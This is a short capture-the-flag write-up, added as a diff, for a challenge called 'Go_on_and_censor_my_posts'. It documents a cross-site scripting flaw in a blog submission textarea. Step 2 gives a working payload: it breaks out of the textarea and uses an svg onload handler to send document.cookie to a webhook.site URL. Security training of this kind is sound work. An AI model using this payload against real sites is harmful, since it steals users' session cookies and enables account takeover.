@@ -1,0 +1,15 @@
+# Challenge `Go_on_and_censor_my_posts` Writeup
+
+- Vulnerability: Cross-Site Scripting (XSS)
+  - Exploits a lack of input validation and sanitization, allowing the injection of malicious scripts into the blog post content.
+- Where: Blog post input field
+  - The vulnerability is present in the textarea of the blog post submission form where user input is accepted.
+- Impact: Unauthorized Data Collection
+  - Exploiting this vulnerability allows an attacker to inject a script that opens a new window, triggering a fetch request to an external site to collect the victim's cookies.
+- NOTE: This is a serious security concern as it enables unauthorized data collection from users interacting with the blog post submission form.
+
+## Steps to Reproduce
+
+1. Navigate to the blog post submission form.
+2. In the content textarea, input the following payload: "</textarea><svg/onload="window.open('https://webhook.site/3a9f1629-aa07-4da4-b8b1-890c4834ceaf?c=' + document.cookie)"><textarea>"
+3. Submit it to admin
